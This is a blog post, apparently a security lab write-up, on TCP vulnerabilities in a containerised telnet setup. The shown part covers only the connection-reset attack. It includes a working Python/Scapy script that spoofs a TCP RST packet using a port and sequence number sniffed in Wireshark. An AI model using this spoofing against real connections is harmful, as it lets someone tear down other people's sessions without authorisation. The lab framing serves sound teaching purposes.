---
title: "Exploring Vulnerabilities in TCP"
date: 2023-04-24
permalink: /posts/2023/04/tcp/
tags:
  - network
  - security
---

# Motivation

TCP is a critical protocol at the transport layer of the OSI model of the network stack, the fourth layer, yet it has some vulnerabilities. We will reset, hijack, and obtain a reverse shell from a `telnet` connection between two unsuspecting users to demonstrate the vulnerabilities.


# Container Environment

Again, there is some set up for this experiment.

We will use several Docker containers to simulate all the involved machines. In this lab we will assume the attacker is on the same LAN as the victim and all other machines involved.

| Machine | IP Address | Notes |
| -------- | -------- | -------- |
| User 1 | 10.9.0.6 | `telnet` Client |
| User 2 | 10.9.0.7 | `telnet` Server |
| Attacker | 10.9.0.1 | Will eventually hijack the `telnet` connection |

There will also be a container that represents a server but we will ignore it for these exercises.

 
# Resetting a telnet Connection

For this demonstration, I will show how an attacker on the same LAN as two machines that have an existing telnet connection can disrupt the connection by spoofing a properly constructed packet.

I first use `telnet` to connect from User 1 to User 2.

Then, I open wireshark and monitor the LAN interface. I select the bridge interface starting with "br-". The characters following may change if you stop and start the containers in a separate occurrence.

## TODO: figure showing wireshark start page

In the `telnet` connection, I run a command like `echo hello` to generate some traffic over the `telnet` connection. 

## TODO: figure showing telnet connection

The last TCP packet sent from User 1 to User 2 will inform the source port number and sequence number used in the RST packet we will spoof from the attacker.

The following code will send our RST packet:


```python
from scapy.all import * 
import argparse
 
def spoof_reset_packet(src_port, seq_num):
  user1_ip = "10.9.0.6"
  user2_ip = "10.9.0.7"
  
  user1_port = src_port
  user2_port = 23
  
  ip = IP(src=user1_ip, dst=user2_ip)
  tcp = TCP(sport=user1_port, dport=user2_port, flags="R", seq=seq_num)
  pkt = ip/tcp
  
  print("SENDING RESET PACKET........")
  send(pkt, verbose=0)
   
if __name__ == "__main__":
  parser = argparse.ArgumentParser()
  parser.add_argument("-p", "--src_port", type=int, help="source port", required=True)
  parser.add_argument("-s", "--seq", type=int, help="last sequence number", required=True)

  args = parser.parse_args()
  spoof_reset_packet(args.src_port, args.seq)
```

For convenience, I designed the program to take in arguments for the source port number and the sequence number. I invoke it as follows with the source port and sequence numbers taken from Wireshark.

## TODO: figure showing program invocation